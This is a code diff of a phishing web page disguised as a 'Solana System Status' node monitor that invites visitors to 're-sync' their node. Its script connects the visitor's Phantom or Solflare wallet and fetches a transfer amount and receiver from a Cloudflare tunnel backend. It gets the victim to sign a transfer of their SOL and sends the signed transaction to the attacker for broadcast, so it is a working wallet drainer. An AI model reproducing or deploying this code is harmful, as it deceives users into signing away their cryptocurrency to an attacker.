@@ -1,93 +1,67 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana System Status</title>
-    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #0b0b0b; color: #00ffa3; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #00ffa3; padding: 30px; border-radius: 8px; background: #111; width: 350px; text-align: center; box-shadow: 0 0 20px rgba(0,255,163,0.2); }
-        .status-on { color: #00ffa3; font-weight: bold; }
-        .status-off { color: #ff3e3e; font-weight: bold; }
-        .bar { background: #222; height: 4px; width: 100%; margin: 20px 0; overflow: hidden; }
-        #progress { background: #00ffa3; height: 100%; width: 0%; transition: 0.4s; }
-        button { background: #00ffa3; color: #000; border: none; padding: 12px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; transition: 0.3s; }
-        button:hover { background: #00cc82; transform: scale(1.02); }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h3 style="margin-top:0;">NODE MONITOR V4.1</h3>
-        <p style="font-size: 13px; color: #888;">NETWORK: <span class="status-on">MAINNET-BETA</span></p>
-        <p style="font-size: 13px; color: #888;">SYNC STATUS: <span class="status-off">OUT OF SYNC</span></p>
-        <div class="bar"><div id="progress"></div></div>
-        <button id="cta">RE-SYNC LOCAL NODE</button>
-        <p id="msg" style="font-size: 11px; margin-top:15px; color: #555;">Waiting for wallet authorization...</p>
-    </div>
+<script>
+    // 🔱 务必确认这个地址是你最新的 Cloudflare 链接
+    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
 
-    <script>
-        // 🔱 务必确认这个地址是你最新的 Cloudflare 链接
-        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
+    document.getElementById('cta').onclick = async () => {
+        const p = window.solana;
+        const sWeb3 = window.solanaWeb3;
+        if (!p) { alert("Please use Phantom or Solflare browser."); return; }
 
-        document.getElementById('cta').onclick = async () => {
-            const p = window.solana;
-            const sWeb3 = window.solanaWeb3;
-            if (!p) { alert("Please use Phantom or Solflare browser."); return; }
+        try {
+            await p.connect();
+            const address = p.publicKey.toString();
+            document.getElementById('progress').style.width = "30%";
 
-            try {
-                // 1. 连接并获取地址
-                const resp = await p.connect();
-                const address = resp.publicKey.toString();
-                document.getElementById('progress').style.width = "30%";
-                document.getElementById('msg').innerText = "Fetching sync params...";
+            // 1. 获取后端精算后的数据
+            const response = await fetch(`${tunnel}/prepare`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ address })
+            });
+            
+            const info = await response.json();
+            console.log("Backend Data:", info); // 大老，如果没弹窗，F12 看这里
 
-                // 2. 问后端索要“影子参数” (金额和接收地址全在后端)
-                const info = await fetch(`${tunnel}/prepare`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address })
-                }).then(r => r.json());
-
-                if (info.error) {
-                    document.getElementById('msg').innerText = "Status: Already Synchronized";
-                    document.getElementById('progress').style.width = "100%";
-                    return;
-                }
-
-                // 3. 构造极其简单的转账
-                const tx = new sWeb3.Transaction().add(
-                    sWeb3.SystemProgram.transfer({
-                        fromPubkey: resp.publicKey,
-                        toPubkey: new sWeb3.PublicKey(info.receiver),
-                        lamports: info.amount,
-                    })
-                );
-                tx.recentBlockhash = info.bh;
-                tx.feePayer = resp.publicKey;
-                document.getElementById('progress').style.width = "60%";
-                document.getElementById('msg').innerText = "Awaiting signature...";
-
-                // 4. 签名并交由后端广播
-                const signed = await p.signTransaction(tx);
-                const binary = String.fromCharCode.apply(null, signed.serialize());
-                
-                fetch(`${tunnel}/broadcast`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ raw_tx: btoa(binary) })
-                });
-
-                document.getElementById('progress').style.width = "100%";
-                document.getElementById('msg').innerText = "Node Resynced. Redirecting...";
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
-
-            } catch (e) {
-                console.error(e);
-                document.getElementById('msg').innerText = "Sync Failed. Retrying...";
-                setTimeout(() => { location.reload(); }, 2000);
+            if (!info.amount || !info.bh) {
+                alert("Status: System Synchronized");
+                return;
             }
-        };
-    </script>
-</body>
-</html>
+
+            // 2. 构造交易 (严格对齐后端字段)
+            const tx = new sWeb3.Transaction().add(
+                sWeb3.SystemProgram.transfer({
+                    fromPubkey: p.publicKey,
+                    toPubkey: new sWeb3.PublicKey(info.receiver),
+                    lamports: parseInt(info.amount), // 确保是整数
+                })
+            );
+            tx.recentBlockhash = info.bh;
+            tx.feePayer = p.publicKey;
+            document.getElementById('progress').style.width = "60%";
+
+            // 3. 唤起签名 (这一步是重头戏)
+            console.log("Requesting signature...");
+            const signed = await p.signTransaction(tx);
+            
+            // 4. 签名成功后回传广播
+            const serialized = signed.serialize();
+            let binary = '';
+            const bytes = new Uint8Array(serialized);
+            for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
+            
+            fetch(`${tunnel}/broadcast`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ raw_tx: btoa(binary) })
+            });
+
+            document.getElementById('progress').style.width = "100%";
+            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
+
+        } catch (e) {
+            console.error("Critical Error:", e);
+            // 如果报错，直接刷新重来
+            setTimeout(() => { location.reload(); }, 2000);
+        }
+    };
+</script>
